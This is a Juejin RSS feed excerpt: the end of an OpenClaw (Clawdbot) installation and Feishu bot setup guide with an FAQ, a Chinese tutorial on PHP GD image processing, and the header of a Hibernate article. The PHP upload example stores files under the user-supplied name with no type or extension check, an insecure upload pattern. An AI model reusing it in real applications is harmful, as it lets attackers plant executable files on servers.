复制对应的 <code>Dashboard URL</code> 到浏览器打开，即可正常查看聊天记录。
<img src="https://image.catchadmin.com/202601281532427.png" alt="Openclaw (原 Clawdbot) Web UI 管理面板 - AI 助手聊天记录" loading="lazy"/></p>
<p>至此 Openclaw (原 Clawdbot) 已安装完成，可以正常访问了。然后聊天框里面首次输入 <code>Hello</code>, <code>Clawdbot</code> 会询问你他应该叫什么，应该叫你什么。就是你需要给它设置个名字，还有 bot 改叫你什么。你可以在聊天框这么输入</p>
<pre><code class="hljs language-shell" lang="shell">Name: Openclaw

My Name: Boss
</code></pre>
<h3 data-id="heading-7">对接飞书</h3>
<p>首先安装飞书插件，输入以下命令</p>
<pre><code class="hljs language-shell" lang="shell">clawdbot plugins install @m1heng-clawd/feishu
</code></pre>
<p>登录飞书开放平台 <a href="https://link.juejin.cn?target=https%3A%2F%2Fopen.feishu.cn%25EF%25BC%258C%25E7%2582%25B9%25E5%2587%25BB%25E3%2580%258C%25E5%25BC%2580%25E5%258F%2591%25E8%2580%2585%25E5%2590%258E%25E5%258F%25B0" target="_blank" title="https://open.feishu.cn%EF%BC%8C%E7%82%B9%E5%87%BB%E3%80%8C%E5%BC%80%E5%8F%91%E8%80%85%E5%90%8E%E5%8F%B0" ref="nofollow noopener noreferrer">open.feishu.cn，点击「开发者后台</a> -&gt; 创建企业自建应用」，如下图
<img src="https://image.catchadmin.com/202601281539117.png" alt="飞书开放平台创建企业自建应用 - Openclaw 对接" loading="lazy"/>
然后点击创建应用，如下
<img src="https://image.catchadmin.com/202601281743642.png" alt="飞书创建应用 - Openclaw AI 机器人" loading="lazy"/>
创建完成后，首先到凭据管理中获取 App ID 和 App Secret，注意保存，后续配置需要使用。
<img src="https://image.catchadmin.com/202601281757469.png" alt="飞书 App ID 和 App Secret 凭据管理" loading="lazy"/>
然后添加机器人，如下操作
<img src="https://image.catchadmin.com/202601281758607.png" alt="飞书添加机器人能力 - Openclaw AI 助手" loading="lazy"/>
首先配置个名字
<img src="https://image.catchadmin.com/202601281758721.png" alt="飞书机器人名称配置 - Openclaw" loading="lazy"/></p>
<p>飞书的其他配置先暂停，回到服务器配置 Openclaw 的飞书参数</p>
<h4 data-id="heading-8">添加飞书配置</h4>
<pre><code class="hljs language-shell" lang="shell">clawdbot config set channels.feishu.appId "飞书 app id"

clawdbot config set channels.feishu.appSecret "飞书 app secret"

clawdbot config set channels.feishu.enabled true
<span class="hljs-meta prompt_">
# </span><span class="bash">推荐使用 websocket</span>
clawdbot config set channels.feishu.connectionMode websocket

clawdbot config set channels.feishu.dmPolicy pairing

clawdbot config set channels.feishu.groupPolicy allowlist

clawdbot config set channels.feishu.requireMention true
</code></pre>
<p>配置完成之后，重启</p>
<pre><code class="hljs language-shell" lang="shell">clawdbot gateway restart
</code></pre>
<p>重启完成后回到飞书，找到「事件和回调」，选择长连接模式，如下图
<img src="https://image.catchadmin.com/202601281802128.png" alt="飞书事件和回调配置 - Openclaw 长连接模式" loading="lazy"/>
如果配置成功，说明连接已建立。继续下面的配置，添加事件，选择「接收消息」事件
<img src="https://image.catchadmin.com/202601281811231.png" alt="飞书添加接收消息事件 - Openclaw AI 助手" loading="lazy"/>
事件添加完成之后，还需要开通权限，有以下权限全部勾选</p>




















<table><thead><tr><th>权限</th><th>Scope（范围）</th><th>Description（说明）</th></tr></thead><tbody><tr><td>contact:user.base:readonly</td><td>用户信息</td><td>获取基础用户信息</td></tr><tr><td>im:message</td><td>消息 全部勾选</td><td>发送和接收消息</td></tr></tbody></table>
<p>如下图
<img src="https://image.catchadmin.com/202601281545906.png" alt="飞书权限配置 - Openclaw 用户信息权限" loading="lazy"/></p>
<p><img src="https://image.catchadmin.com/202601281549559.png" alt="飞书消息权限配置 - Openclaw AI 机器人" loading="lazy"/></p>
<p>以上步骤全部完成后，即可与机器人对话。但在此之前需要先创建一个版本
<img src="https://image.catchadmin.com/202601281814848.png" alt="飞书应用版本发布 - Openclaw AI 助手上线" loading="lazy"/></p>
<blockquote>
<p>注意：每次修改配置后都需要重新发布版本，建议全部配置完成后再统一发布。</p>
</blockquote>
<p>发布完成后，回到飞书客户端，可以看到应用已上线，点击打开应用
<img src="https://image.catchadmin.com/202601281816608.png" alt="飞书应用发布成功 - Openclaw AI 机器人" loading="lazy"/>
向机器人发送 <code>Hello</code>，即可收到 Moltbot 的回复
<img src="https://image.catchadmin.com/202601281817700.png" alt="飞书 Openclaw AI 助手回复测试成功" loading="lazy"/></p>
<h3 data-id="heading-9">常见问题 FAQ</h3>
<h4 data-id="heading-10">OpenClaw 和 Clawdbot、Moltbot 是什么关系？</h4>
<p>OpenClaw 是该项目的最新正式名称。项目最初叫 Clawdbot，后因商标问题更名为 Moltbot，最终在 2025 年 1 月正式定名为 OpenClaw。三者是同一个项目的不同阶段命名。</p>
<h4 data-id="heading-11">OpenClaw 支持哪些 AI 模型？</h4>
<p>OpenClaw 支持多种 AI 模型服务商，包括 Anthropic Claude、OpenAI GPT、通义千问（Qwen）、KIMI、小米 MiMo 等。本教程使用通义千问是因为其免费额度充足，适合入门学习。</p>
<h4 data-id="heading-12">为什么安装时提示 npm install failed？</h4>
<p>这通常是服务器内存不足导致的。新版本脚本对内存要求较高，2G 内存可能会出现 OOM（内存溢出）。建议配置 swap 交换空间，将硬盘空间作为虚拟内存使用。</p>
<h4 data-id="heading-13">OpenClaw 可以在 Windows 或 macOS 上运行吗？</h4>
<p>可以。OpenClaw 支持 Mac、Windows 和 Linux 系统。本教程以 Linux 为例，其他系统的安装方式可参考<a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.openclaw.ai%2F" target="_blank" title="https://docs.openclaw.ai/" ref="nofollow noopener noreferrer">官方文档</a>。</p>
<h4 data-id="heading-14">飞书机器人配置后无法收到消息怎么办？</h4>
<p>请检查以下几点：</p>
<ol>
<li>确认飞书插件已正确安装（<code>clawdbot plugins install @m1heng-clawd/feishu</code>）</li>
<li>检查 App ID 和 App Secret 配置是否正确</li>
<li>确认已开通「接收消息」事件权限</li>
<li>检查长连接模式是否配置成功</li>
<li>确保应用版本已发布</li>
</ol>
<h4 data-id="heading-15">OpenClaw 数据安全吗？</h4>
<p>OpenClaw 运行在你自己的服务器上，所有数据都在本地存储，不会上传到第三方云端。但由于它具有系统级权限，建议在独立的服务器上部署，避免在生产环境或重要数据的机器上运行。</p>
<h4 data-id="heading-16">除了飞书，OpenClaw 还支持哪些平台？</h4>
<p>OpenClaw 支持多个聊天平台，包括 WhatsApp、Telegram、Discord、Slack、Microsoft Teams、Signal、iMessage、Google Chat、Twitch 等。每个平台需要安装对应的插件。</p>
<h4 data-id="heading-17">OpenClaw 可以做什么？</h4>
<p>OpenClaw 可以执行多种任务：</p>
<ul>
<li>邮件管理和自动回复</li>
<li>日程安排和提醒</li>
<li>浏览网页和数据提取</li>
<li>文件读写和管理</li>
<li>执行 Shell 命令</li>
<li>编写和运行代码</li>
<li>数据查询和分析</li>
</ul>
<h4 data-id="heading-18">如何更新 OpenClaw 到最新版本？</h4>
<p>使用以下命令更新：</p>
<pre><code class="hljs language-shell" lang="shell">openclaw update
</code></pre>
<h4 data-id="heading-19">OpenClaw 命令和 clawdbot 命令有什么区别？</h4>
<p>OpenClaw 更名后，官方推荐使用 <code>openclaw</code> 命令，但为了兼容性，<code>clawdbot</code> 命令仍然可用。两者功能完全相同，建议新用户直接使用 <code>openclaw</code> 命令。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[用 PHP 玩转图片：缩放、裁剪、水印、滤镜一网打尽]]></title>    <link>https://juejin.cn/post/7601169987395403827</link>    <guid>https://juejin.cn/post/7601169987395403827</guid>    <pubDate>2026-01-31T00:39:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7601169987395403827" data-draft-id="7600982613654192178" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="用 PHP 玩转图片：缩放、裁剪、水印、滤镜一网打尽"/> <meta itemprop="keywords" content="后端,PHP"/> <meta itemprop="datePublished" content="2026-01-31T00:39:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="BingoGo"/> <meta itemprop="url" content="https://juejin.cn/user/993614242266077"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            用 PHP 玩转图片：缩放、裁剪、水印、滤镜一网打尽
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/993614242266077/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    BingoGo
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-31T00:39:34.000Z" title="Sat Jan 31 2026 00:39:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-31
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">用 PHP 玩转图片：缩放、裁剪、水印、滤镜一网打尽</h2>
<p>提到 PHP 和图像，你会想到什么？大概是上传一张图片到网站，然后收工。但 PHP 可不只是个上传工具——它在图像处理方面藏着不少本事。</p>
<p>图片太大放不下网页？需要裁掉背景里那个乱入的路人？PHP 都能搞定。无论是缩放、裁剪、加水印，还是像 Instagram 那样加滤镜，PHP 都能胜任。</p>
<p>这篇文章会带你了解 PHP 图像处理的更多玩法。我们会深入 GD 库，顺便聊聊 Imagick。</p>
<h3 data-id="heading-1">GD 和 Imagick：两大图像处理库</h3>
<p>在动手之前，先介绍两个核心工具：GD 库和 Imagick。</p>
<h4 data-id="heading-2">GD 库：稳定可靠的老伙计</h4>
<p>PHP 内置的 GD 库是个经典选择，适合处理基础的图像操作：缩放、裁剪、添加文字。它默认就在 PHP 里，不用额外安装。虽然不是最炫的，但够用、稳定。</p>
<h4 data-id="heading-3">Imagick：功能更强的新选择</h4>
<p>Imagick 是另一个图像处理库，功能更强大。它擅长处理矢量图、应用特效、支持更多格式。如果你需要做复杂的图像处理，Imagick 是更好的选择。不过本文主要用 GD 库来演示。</p>
<h3 data-id="heading-4">基础：图像上传</h3>
<p>在处理图像之前，得先把它上传到服务器。下面是一个基础的上传脚本：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'REQUEST_METHOD'</span>] == <span class="hljs-string">'POST'</span> &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'image'</span>])) {
    <span class="hljs-variable">$image</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'image'</span>];
    <span class="hljs-variable">$uploadDir</span> = <span class="hljs-string">'uploads/'</span>;
    <span class="hljs-variable">$uploadFile</span> = <span class="hljs-variable">$uploadDir</span> . <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$image</span>[<span class="hljs-string">'name'</span>]);
    
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$image</span>[<span class="hljs-string">'tmp_name'</span>], <span class="hljs-variable">$uploadFile</span>)) {
        <span class="hljs-keyword">echo</span> <span class="hljs-string">'Image uploaded successfully!'</span>;
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-keyword">echo</span> <span class="hljs-string">'Failed to upload image.'</span>;
    }
}
</code></pre>
<p>这段代码把上传的图片移动到指定目录，接下来就可以开始处理了。</p>
<h3 data-id="heading-5">使用 GD 库处理图像</h3>
<p>上传搞定了，现在进入正题——图像处理。</p>
<h4 data-id="heading-6">缩放图像</h4>
<p>图片太大会拖慢页面加载速度。用 GD 库可以轻松缩放：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">resizeImage</span>(<span class="hljs-params"><span class="hljs-variable">$source</span>, <span class="hljs-variable">$target</span>, <span class="hljs-variable">$width</span>, <span class="hljs-variable">$height</span></span>) </span>{
    <span class="hljs-keyword">list</span>(<span class="hljs-variable">$originalWidth</span>, <span class="hljs-variable">$originalHeight</span>) = <span class="hljs-title function_ invoke__">getimagesize</span>(<span class="hljs-variable">$source</span>);
    <span class="hljs-variable">$image</span> = <span class="hljs-title function_ invoke__">imagecreatefromjpeg</span>(<span class="hljs-variable">$source</span>);
    
    <span class="hljs-variable">$newImage</span> = <span class="hljs-title function_ invoke__">imagecreatetruecolor</span>(<span class="hljs-variable">$width</span>, <span class="hljs-variable">$height</span>);
    <span class="hljs-title function_ invoke__">imagecopyresized</span>(<span class="hljs-variable">$newImage</span>, <span class="hljs-variable">$image</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$width</span>, <span class="hljs-variable">$height</span>, <span class="hljs-variable">$originalWidth</span>, <span class="hljs-variable">$originalHeight</span>);
    
    <span class="hljs-title function_ invoke__">imagejpeg</span>(<span class="hljs-variable">$newImage</span>, <span class="hljs-variable">$target</span>);
    <span class="hljs-title function_ invoke__">imagedestroy</span>(<span class="hljs-variable">$image</span>);
    <span class="hljs-title function_ invoke__">imagedestroy</span>(<span class="hljs-variable">$newImage</span>);
}
</code></pre>
<p>这个函数把图像缩放到指定的宽高，适合在展示前调整图片尺寸。</p>
<h4 data-id="heading-7">裁剪图像</h4>
<p>需要裁掉图片的某个区域？用 <code>imagecrop()</code> 函数：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cropImage</span>(<span class="hljs-params"><span class="hljs-variable">$source</span>, <span class="hljs-variable">$target</span>, <span class="hljs-variable">$x</span>, <span class="hljs-variable">$y</span>, <span class="hljs-variable">$width</span>, <span class="hljs-variable">$height</span></span>) </span>{
    <span class="hljs-keyword">list</span>(<span class="hljs-variable">$originalWidth</span>, <span class="hljs-variable">$originalHeight</span>) = <span class="hljs-title function_ invoke__">getimagesize</span>(<span class="hljs-variable">$source</span>);
    <span class="hljs-variable">$image</span> = <span class="hljs-title function_ invoke__">imagecreatefromjpeg</span>(<span class="hljs-variable">$source</span>);
    
    <span class="hljs-variable">$croppedImage</span> = <span class="hljs-title function_ invoke__">imagecrop</span>(<span class="hljs-variable">$image</span>, [<span class="hljs-string">'x'</span> =&gt; <span class="hljs-variable">$x</span>, <span class="hljs-string">'y'</span> =&gt; <span class="hljs-variable">$y</span>, <span class="hljs-string">'width'</span> =&gt; <span class="hljs-variable">$width</span>, <span class="hljs-string">'height'</span> =&gt; <span class="hljs-variable">$height</span>]);
    
    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$croppedImage</span> !== <span class="hljs-literal">FALSE</span>) {
        <span class="hljs-title function_ invoke__">imagejpeg</span>(<span class="hljs-variable">$croppedImage</span>, <span class="hljs-variable">$target</span>);
        <span class="hljs-title function_ invoke__">imagedestroy</span>(<span class="hljs-variable">$croppedImage</span>);
    }
    <span class="hljs-title function_ invoke__">imagedestroy</span>(<span class="hljs-variable">$image</span>);
}
</code></pre>
<p>指定裁剪区域的坐标和尺寸，PHP 会帮你完成剩下的工作。</p>
<h4 data-id="heading-8">添加水印</h4>
<p>如果你运营一个允许用户上传图片的网站，给图片加水印可以防止盗用。下面是添加水印的方法：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addWatermark</span>(<span class="hljs-params"><span class="hljs-variable">$imagePath</span>, <span class="hljs-variable">$watermarkPath</span>, <span class="hljs-variable">$targetPath</span></span>) </span>{
    <span class="hljs-variable">$image</span> = <span class="hljs-title function_ invoke__">imagecreatefromjpeg</span>(<span class="hljs-variable">$imagePath</span>);
    <span class="hljs-variable">$watermark</span> = <span class="hljs-title function_ invoke__">imagecreatefrompng</span>(<span class="hljs-variable">$watermarkPath</span>);
    
    <span class="hljs-variable">$imageWidth</span> = <span class="hljs-title function_ invoke__">imagesx</span>(<span class="hljs-variable">$image</span>);
    <span class="hljs-variable">$imageHeight</span> = <span class="hljs-title function_ invoke__">imagesy</span>(<span class="hljs-variable">$image</span>);
    <span class="hljs-variable">$watermarkWidth</span> = <span class="hljs-title function_ invoke__">imagesx</span>(<span class="hljs-variable">$watermark</span>);
    <span class="hljs-variable">$watermarkHeight</span> = <span class="hljs-title function_ invoke__">imagesy</span>(<span class="hljs-variable">$watermark</span>);
    
    <span class="hljs-comment">// 水印放在右下角</span>
    <span class="hljs-variable">$destX</span> = <span class="hljs-variable">$imageWidth</span> - <span class="hljs-variable">$watermarkWidth</span> - <span class="hljs-number">10</span>;
    <span class="hljs-variable">$destY</span> = <span class="hljs-variable">$imageHeight</span> - <span class="hljs-variable">$watermarkHeight</span> - <span class="hljs-number">10</span>;
    
    <span class="hljs-title function_ invoke__">imagecopy</span>(<span class="hljs-variable">$image</span>, <span class="hljs-variable">$watermark</span>, <span class="hljs-variable">$destX</span>, <span class="hljs-variable">$destY</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$watermarkWidth</span>, <span class="hljs-variable">$watermarkHeight</span>);
    
    <span class="hljs-title function_ invoke__">imagejpeg</span>(<span class="hljs-variable">$image</span>, <span class="hljs-variable">$targetPath</span>);
    <span class="hljs-title function_ invoke__">imagedestroy</span>(<span class="hljs-variable">$image</span>);
    <span class="hljs-title function_ invoke__">imagedestroy</span>(<span class="hljs-variable">$watermark</span>);
}
</code></pre>
<p>这个函数把 PNG 格式的水印叠加到图片右下角。</p>
<h3 data-id="heading-9">进阶：滤镜和缩略图</h3>
<p>掌握了基础操作，来看看更高级的玩法。</p>
<h4 data-id="heading-10">应用滤镜</h4>
<p>GD 库支持给图像添加滤镜。比如把图片转成灰度：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">applyGrayscale</span>(<span class="hljs-params"><span class="hljs-variable">$imagePath</span>, <span class="hljs-variable">$targetPath</span></span>) </span>{
    <span class="hljs-variable">$image</span> = <span class="hljs-title function_ invoke__">imagecreatefromjpeg</span>(<span class="hljs-variable">$imagePath</span>);
    
    <span class="hljs-title function_ invoke__">imagefilter</span>(<span class="hljs-variable">$image</span>, IMG_FILTER_GRAYSCALE);
    
    <span class="hljs-title function_ invoke__">imagejpeg</span>(<span class="hljs-variable">$image</span>, <span class="hljs-variable">$targetPath</span>);
    <span class="hljs-title function_ invoke__">imagedestroy</span>(<span class="hljs-variable">$image</span>);
}
</code></pre>
<p>除了灰度，还可以调整亮度、对比度，甚至做像素化效果。</p>
<h4 data-id="heading-11">生成缩略图</h4>
<p>在图片库或商品列表中，缩略图是必不可少的。下面是生成缩略图的函数：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">createThumbnail</span>(<span class="hljs-params"><span class="hljs-variable">$source</span>, <span class="hljs-variable">$target</span>, <span class="hljs-variable">$thumbWidth</span></span>) </span>{
    <span class="hljs-keyword">list</span>(<span class="hljs-variable">$originalWidth</span>, <span class="hljs-variable">$originalHeight</span>) = <span class="hljs-title function_ invoke__">getimagesize</span>(<span class="hljs-variable">$source</span>);
    <span class="hljs-variable">$thumbHeight</span> = (<span class="hljs-variable">$thumbWidth</span> / <span class="hljs-variable">$originalWidth</span>) * <span class="hljs-variable">$originalHeight</span>;
    
    <span class="hljs-variable">$image</span> = <span class="hljs-title function_ invoke__">imagecreatefromjpeg</span>(<span class="hljs-variable">$source</span>);
    <span class="hljs-variable">$thumb</span> = <span class="hljs-title function_ invoke__">imagecreatetruecolor</span>(<span class="hljs-variable">$thumbWidth</span>, <span class="hljs-variable">$thumbHeight</span>);
    
    <span class="hljs-title function_ invoke__">imagecopyresized</span>(<span class="hljs-variable">$thumb</span>, <span class="hljs-variable">$image</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$thumbWidth</span>, <span class="hljs-variable">$thumbHeight</span>, <span class="hljs-variable">$originalWidth</span>, <span class="hljs-variable">$originalHeight</span>);
    
    <span class="hljs-title function_ invoke__">imagejpeg</span>(<span class="hljs-variable">$thumb</span>, <span class="hljs-variable">$target</span>);
    <span class="hljs-title function_ invoke__">imagedestroy</span>(<span class="hljs-variable">$image</span>);
    <span class="hljs-title function_ invoke__">imagedestroy</span>(<span class="hljs-variable">$thumb</span>);
}
</code></pre>
<p>这个函数按指定宽度生成缩略图，同时保持原图的宽高比。</p>
<h3 data-id="heading-12">常见问题排查</h3>
<p>图像处理有时会遇到一些问题，这里列出几个常见的。</p>
<h4 data-id="heading-13">图像损坏</h4>
<p>如果 PHP 无法正确处理图像文件，可能会导致损坏。处理前先用 <code>getimagesize()</code> 验证文件是否为有效图像，同时确认文件格式（JPEG、PNG、GIF）。</p>
<h4 data-id="heading-14">内存不足</h4>
<p>处理大图片时可能会遇到内存限制。可以在 <code>php.ini</code> 中调整 <code>memory_limit</code>。如果是共享主机，可能需要联系服务商提升配额。</p>
<h3 data-id="heading-15">总结</h3>
<p>PHP 的图像处理能力远不止上传那么简单。借助 GD 和 Imagick，你可以完成缩放、裁剪、加水印、应用滤镜等操作。无论是搭建图片库、处理用户上传的内容，还是优化网站图片，这些技能都能派上用场。
<a href="https://link.juejin.cn?target=https%3A%2F%2Fcatchadmin.com%2Fpost%2F2026-01%2Fopenclaw-installed" target="_blank" title="https://catchadmin.com/post/2026-01/openclaw-installed" ref="nofollow noopener noreferrer">用 PHP 玩转图片：缩放、裁剪、水印、滤镜一网打尽</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Hibernate（75）如何在DDD（领域驱动设计）中使用Hibernate？]]></title>    <link>https://juejin.cn/post/7600787795478462510</link>    <guid>https://juejin.cn/post/7600787795478462510</guid>    <pubDate>2026-01-30T23:40:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600787795478462510" data-draft-id="7601028900886282286" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Hibernate（75）如何在DDD（领域驱动设计）中使用Hibernate？"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-30T23:40:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Victor356"/> <meta itemprop="url" content="https://juejin.cn/user/3492507879476878"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Hibernate（75）如何在DDD（领域驱动设计）中使用Hibernate？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3492507879476878/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Victor356
